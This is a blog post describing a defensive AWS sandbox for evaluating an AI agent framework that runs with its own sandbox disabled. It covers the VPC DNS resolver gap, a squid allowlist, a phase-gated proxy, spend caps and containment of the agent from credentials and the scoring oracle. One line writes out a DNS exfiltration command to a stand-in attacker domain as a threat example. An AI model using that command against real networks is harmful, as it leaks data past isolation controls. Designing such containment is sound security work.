# I thought "private subnet, no NAT" meant isolated. The VPC DNS resolver disagreed.

A few months back I was designing a network sandbox for evaluating an AI agent framework. The core requirement was simple: the eval guest cannot reach the internet during the run. No web browsing, no package downloads, nothing.

My first instinct was the standard play: private subnet, no NAT gateway, no default route. That, I assumed, was sufficient.

It isn't. Not in AWS, and not for the specific threat model I was working against.

The Amazon-provided VPC DNS resolver sits at two addresses: VPC+2 (the second IP in your VPC CIDR, so 10.99.0.2 for a 10.99.0.0/24 VPC) and the link-local address 169.254.169.253. It answers DNS queries from any subnet in the VPC regardless of route tables. Security groups don't filter it. NACLs don't filter it. VPC Flow Logs don't record it.

A subnet with no IGW, no NAT gateway, no default route, and the tightest security group you can write can still exfiltrate data over DNS. `dig @10.99.0.2 <encoded-payload>.attacker.example.tld` fires that query through AWS's resolvers and onto the public internet. No routing entry required. The only prerequisite is that the attacker controls a domain.

For most workloads this doesn't matter. For an eval guest running model-written code with its safety sandbox disabled, this is a hole that has to close before anything else does.

The fix is `enableDnsSupport: false` on the VPC, which removes the resolver entirely. DHCP options still point at 1.1.1.1 and 9.9.9.9, but only the proxy instance's security group has port 53 egress, to exactly those two /32 addresses. The guest resolves nothing on its own. During setup, squid on the proxy resolves for it; during the eval run, there's no DNS at all.

That gotcha set the tone for everything else I built.

---

## Why I needed a sandbox in the first place

The framework I wanted to test is Harness2, from Google Research (arXiv 2610.14224). The paper's thesis: the system around a model (prompts, tools, guardrails, memory, subagents, plugins) matters as much as the model weights, and can be optimized without touching the weights using a Propose-Probe-Compose loop with no ground truth required. I've been skeptical of the "no ground truth" claim and wanted to run it against Bedrock models to see what it actually produces.

The complication is how Harness2 runs. It executes with Codex's sandbox completely off (`--dangerously-bypass-approvals-and-sandbox`). The optimizer can rewrite guardrails.md during a rollout, generate executable plugins and hooks, and the full environment including any credential variables passes to agent subprocesses. There is no built-in spend cap. Rollouts share `/tmp` and npm prefixes across the session.

Running this on a machine connected to a production AWS account is inadvisable; a shared development server has the same problem. You need a place where the guest can call Bedrock models and nothing else, where the financial blast radius is bounded before the first token fires, and where the whole environment tears down cleanly when you're done.

Standard "private subnet plus NAT" fails at least three of those requirements. Hence this.

---

## Two boxes, four CDK stacks

The architecture is two EC2 instances in a single VPC. One is a proxy and gateway; one is the untrusted eval guest.

The proxy lives in a public subnet (10.99.0.0/26) with a fixed private IP (10.99.0.10) and an Elastic IP. It runs two services: squid on port 3128 as an allowlist CONNECT proxy, and LiteLLM on port 4000 as a Bedrock gateway with virtual keys and per-key spend caps. The phase gate uses nftables. The proxy's IAM role is scoped to invoke Bedrock on specific model ARNs only. Those credentials never reach the guest.

The eval guest lives in an isolated subnet (10.99.0.64/26) at 10.99.0.70. No instance profile. IMDS disabled post-boot. The link-local address 169.254.169.254 has the same property as the VPC DNS resolver: security groups don't filter link-local traffic, so explicit disablement is the only effective control. The guest's only allowed egress is to the proxy on ports 3128 and 4000.

The CDK splits this across four stacks. H2Network provisions the VPC, subnets, security group matrix, DHCP options with DNS support off, KMS-encrypted flow logs (all traffic), and an EC2 Instance Connect endpoint so the operator can SSH in without an internet-facing bastion. H2Proxy deploys the proxy instance and both services; H2Eval deploys the guest with the constraints above. H2Guardrails creates an AWS Budget with spend alerts at 50%, 80%, and 100% and a Budget Action that auto-attaches a `Deny bedrock:*` IAM policy to the gateway credential when the account hits 100%.

---

## The phase gate

The phase switcher, `h2-egress`, runs on the proxy and is controlled by the operator from outside the guest. It swaps squid's ACL file and nftables rules atomically.

Three phases. `closed` is the boot state. Squid denies every CONNECT request. LiteLLM is blocked by nftables. The guest can reach nothing.

`setup` opens squid to a frozen allowlist. Six pinned toolchain installs (Node 22, Bun 1.3.11, Codex 0.144.6, OpenCode at a specific commit SHA, Harness2 at commit 1cfe254, harvey-labs at b58a28ae) resolve to nine distinct CONNECT hostnames across nodejs.org, GitHub, npm, and PyPI. Two apt mirror hostnames are allowed on plain HTTP:80. LiteLLM stays blocked during setup. This is the only window for downloading packages.

`run` closes squid entirely (empty allowlist) and opens port 4000 to the guest. During the eval, the guest's only reachable destination is the LiteLLM gateway: no package registries, no web access, no path to the scoring oracle (the judge's task.json and rubrics, which sit on the proxy's disk) or the home network.

That last property serves two purposes. The obvious one is containment. The less obvious one is benchmark integrity: if the guest can browse during the run, you can't know what influenced the results.

The allowlists are byte-frozen in the test suite. Editing them fails the build until the freeze is regenerated after review.

---

## Spending: two layers, different lag times

The guest receives a LiteLLM virtual key, not AWS credentials. It lives in a tmpfs path (`/run/h2/keys.env`, mode 0600, owned by the eval user) and never touches disk. After the run, `run-arm.sh` shreds the guest copy and calls LiteLLM's `/key/delete` endpoint. The script has an EXIT/ERR trap so this happens even on crash or Ctrl-C.

The spend cap is $3,500 by default (this was a deliberate decision; the eval models are expensive and a runaway rollout could burn real money fast). That cap is enforced twice.

LiteLLM `max_budget` is primary. It enforces per-key and gateway-wide, evaluated on every request. When the key hits the limit, the request fails immediately.

The AWS Budget Action is the backstop. AWS evaluates budget spend every few hours, not per-request. If LiteLLM's enforcement fails for any reason, the Budget Action attaches a `Deny bedrock:*` policy to the gateway credential at the IAM level. That attachment lags the actual overage by 8-24 hours in practice, which is why LiteLLM carries the primary enforcement responsibility.

The cap value is in `cdk.json` only. `setup.sh` reads it from there. There is no second copy to drift out of sync.

---

## Doubled controls

A principle from the NetOps design review: for this kind of sandbox, every critical control should appear twice, in two different components that don't share a failure mode.

Security groups restrict the guest's egress to proxy:3128 and proxy:4000. Squid's allowlist enforces the same boundary from the proxy side. The VPC resolver is disabled. Squid also explicitly denies CONNECT requests to IP-literal destinations and blocks DNS rebinding to private IP ranges, so if the DNS config were ever reverted, the squid side would still block the channel.

LiteLLM `max_budget` enforces per-request. The AWS Budget Action enforces at the IAM level. The guest has no instance profile; IMDS is also disabled explicitly. Eval processes run as a dedicated `eval` system user and inside a bubblewrap jail with private `/tmp` and `$HOME`, read-only toolchain mounts, and no unshare privileges.

None of these pairs is redundant in the sense of "pick one." Each pair defends against a different failure mode in the other layer.

---

## What's proven and what isn't

This build is code-complete. It has never touched AWS.

What was verified on this build host (which runs with no AWS credentials):

The CDK synthesizes cleanly in both credential modes (IAM role for the gateway instance, or an IAM user with a manually created access key as fallback). That's four stacks, synthesized twice. cdk-nag runs at synthesis time with zero unsuppressed findings; there are seven acknowledged exceptions with written justifications. 120 pytest tests pass: CDK config validation, every Gherkin scenario from the requirements document, NetOps delta checks, allowlist byte-freeze assertions, and operator-script behavior under poisoned stub binaries. All 16 shell scripts pass shellcheck. `setup.sh --dry-run` under poisoned stubs makes zero real AWS or SSH calls. Supply-chain pins for all toolchain downloads were verified against live upstream checksums on 2026-10-22.

What a real deploy still needs to test:

- Whether CloudFormation accepts the templates.
- Whether the network actually isolates as designed.
- Whether squid's config behaves as written against real traffic.
- Whether LiteLLM's cost tracking and kill switch work.
- Whether the Budget Action triggers and attaches correctly.
- Whether the guest bootstrap completes on a live Ubuntu 24.04 instance.
- What the whole thing actually costs.

`smoke-isolation.sh` is the network verification step. It runs must-fail connectivity tests from three vantage points: the guest, the proxy, and inside the bubblewrap jail. `setup.sh` calls it after bring-up and aborts if any test passes when it should fail. Whether those tests cover all the holes is itself unverified until someone runs them on live infrastructure.

The honest position: the design has been reviewed, the CDK has been linted and nag-checked, and the scripts work correctly against stubs. What I have is a carefully specified and tested kit. The first deploy is where the design proves itself.

---

## What comes next

First deploy. That means a fresh sandbox AWS account, `make verify` to confirm the build still passes on whatever workstation runs it, `scripts/setup.sh`, and watching `smoke-isolation.sh` succeed or abort. If it aborts, that's the design working.

After bring-up: `smoke-paid.sh` makes one real Bedrock call per model and confirms spend greater than zero appears in LiteLLM. Then a short soak run with a small budget cap to confirm Cost Explorer matches LiteLLM's tracking before trusting the spend controls for a real rollout. Then Harness2.

---

## Get the code

```bash
git clone https://github.com/ccrngd1/harness2-eval
cd harness2-eval/infra
make venv      # one-time toolchain setup
make verify    # lint + synth + 120 tests, no AWS credentials needed
```

There is no package on PyPI or npm. The repo is the install. `VERIFICATION.md` has the full breakdown of what is and isn't proven. `NETOPS-CHECKLIST.md` has the security decisions with file and line references for every control.

The `--dry-run` flag on the operator scripts will walk you through the full bring-up and teardown sequence against stubs before you spend a dollar.
